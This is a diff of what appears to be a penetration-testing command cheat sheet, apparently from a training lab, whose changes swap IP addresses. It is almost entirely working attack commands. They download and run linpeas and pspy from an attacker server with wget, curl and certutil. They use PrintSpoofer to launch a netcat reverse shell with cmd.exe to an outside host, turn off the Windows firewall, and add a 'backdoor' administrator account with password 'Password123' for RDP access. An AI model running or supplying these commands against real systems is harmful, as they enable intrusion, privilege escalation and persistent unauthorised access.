@@ -73,7 +73,7 @@ wget http://192.168.45.238:8000/pspy64 -O /dev/shm/pspy;chmod +x /dev/shm/pspy;
 certutil.exe -f -urlcache -split http://192.168.45.187:8000/
 
 # Uploaded nc.exe from /usr/share/windows-resources/binaries/nc.exe
-.\PrintSpoofer64.exe -c ".\nc.exe -e cmd.exe 192.168.45.163 6969"
+.\PrintSpoofer64.exe -c ".\nc.exe -e cmd.exe 192.168.45.238 6969"
 
 .\PrintSpoofer64.exe -i -c C:\Windows\Tasks\binary.exe
 
@@ -87,7 +87,7 @@ netsh advfirewall set allprofiles state off
 net user /add backdoor Password123
 net localgroup administrators /add backdoor
 net localgroup "Remote Desktop Users" backdoor /add
-xfreerdp /v:192.168.152.153 /u:backdoor /p:Password123 /cert:ignore +clipboard
+xfreerdp /v:192.168.174.221 /u:backdoor /p:Password123 /cert:ignore +clipboard
 
 curl http://192.168.45.163:8000/linpeas.sh -o linpeas.sh;chmod +x linpeas.sh;
 curl http://192.168.45.163:8000/pspy64 -o pspy64;chmod +x pspy64;./pspy64
